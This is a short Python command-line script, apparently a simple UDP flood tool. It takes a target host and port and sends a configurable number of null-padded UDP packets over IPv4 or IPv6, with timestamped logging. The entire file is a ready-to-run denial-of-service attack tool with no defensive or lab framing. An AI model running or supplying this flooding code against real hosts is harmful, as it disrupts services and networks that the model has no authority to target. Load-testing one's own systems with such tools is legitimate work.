#!/usr/bin/env python3


# Created by:   VPR
# Created:      September 1st, 2025

# Updated:      VPR
# Updated:      September 1st, 2025

# Description:  A simple udp socket script for sending udp packets to a target.
               
# Usage:        usage: python-udp-flood.py [-h] -H HOST -p PORT [-n ITERATIONS] [-6]

# License:      MIT (c) VPR, VPR-labs, et. al, 2025


from socket import socket, AF_INET, AF_INET6, SOCK_DGRAM
from argparse import ArgumentParser, Namespace
from datetime import datetime


def time_now()                -> str:  return datetime.now().strftime("[%FT%TZ]")
def log_info(message: str)    -> None: print(f"{time_now()} [ ] {message}")
def log_warn(message: str)    -> None: print(f"{time_now()} [!] {message}")
def log_success(message: str) -> None: print(f"{time_now()} [+] {message}")
def log_error(message: str)   -> None: print(f"{time_now()} [-] {message}")

def build_message(n_padding: int = 32) -> bytes:
    return b''.ljust(n_padding, b'\x00')

def udp_flood_target(args: Namespace) -> None:
    family = AF_INET if not args.ipv6 else AF_INET6
    s = socket(family, SOCK_DGRAM)

    payload = build_message()
    log_warn(f"Preparing UDP flood: host={args.host} port={args.port} packets={args.packets} packet_length={len(payload)} ipv6={args.ipv6}")

    log_info(f"Sending {args.packets} packets...")
    for _ in range(args.packets):
        s.sendto( payload, (args.host,args.port) )
    log_success(f"{args.packets} packets sent to {args.host}:{args.port}.")


if __name__ == "__main__":
    p = ArgumentParser(description="Simple UDP Flood Script over IPv4/IPv6")
    p.add_argument( "-H", "--host",
                    dest="host",
                    type=str,
                    default="",
                    required=True )
    p.add_argument( "-p", "--port",
                    dest="port",
                    type=int,
                    default=8000,
                    required=True )
    p.add_argument( "-n", "--packets",
                    dest="packets",
                    type=int,
                    default=1000 )
    p.add_argument( "-6", "--ipv6",
                    dest="ipv6",
                    action="store_true",
                    default=False )
    args = p.parse_args()

    udp_flood_target(args)
